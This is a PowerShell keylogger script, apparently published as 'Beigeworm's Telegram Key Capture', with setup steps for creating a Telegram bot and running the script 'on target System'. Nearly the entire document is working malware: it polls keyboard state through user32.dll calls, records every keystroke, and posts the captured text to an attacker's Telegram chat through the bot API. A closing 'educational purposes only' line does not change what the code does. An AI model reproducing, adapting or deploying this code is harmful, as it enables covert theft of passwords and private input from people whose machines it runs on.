<#
============================================= Beigeworm's Telegram Key Capture ========================================================

SYNOPSIS
This script connects target computer with a telegram chat to capture keystrokes.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. add chat ID for the chat bot (use this below to find the chat id) 

---------------------------------------------------
$Token = "Token_Here" # Your Telegram Bot Token 
$url = 'https://api.telegram.org/bot{0}' -f $Token
$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-----------------------------------------------------

5. Run Script on target System

THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
#>
#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
$Token = "TOKEN_HERE"  # Your Telegram Token
$ChatID = "CHAT_ID_HERE"   # Your Chat ID (see above for setup)
$PassPhrase = "$env:COMPUTERNAME"
$URL='https://api.telegram.org/bot{0}' -f $Token 


Function KeyCapture {
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
$keyPressed = $false
try{
while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
Start-Sleep -Milliseconds 30
for ($asc = 8; $asc -le 254; $asc++){
$keyst = $API::GetAsyncKeyState($asc)
if ($keyst -eq -32767) {
$keyPressed = $true
$LastKeypressTime.Restart()
$null = [console]::CapsLock
$vtkey = $API::MapVirtualKey($asc, 3)
$kbst = New-Object Byte[] 256
$checkkbst = $API::GetKeyboardState($kbst)
$logchar = New-Object -TypeName System.Text.StringBuilder          
  if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
    $LString = $logchar.ToString()
      if ($asc -eq 8) {$LString = "[BKSP]"}
      if ($asc -eq 13) {$LString = "[ENT]"}
      if ($asc -eq 27) {$LString = "[ESC]"}
      $nosave += $LString 
}}}}}
finally{
If ($keyPressed) {
$escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
$escmsg = "Keys Captured : "+$escmsgsys
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
irm -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json" 
$keyPressed = $false
$nosave = ""
}
}
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}
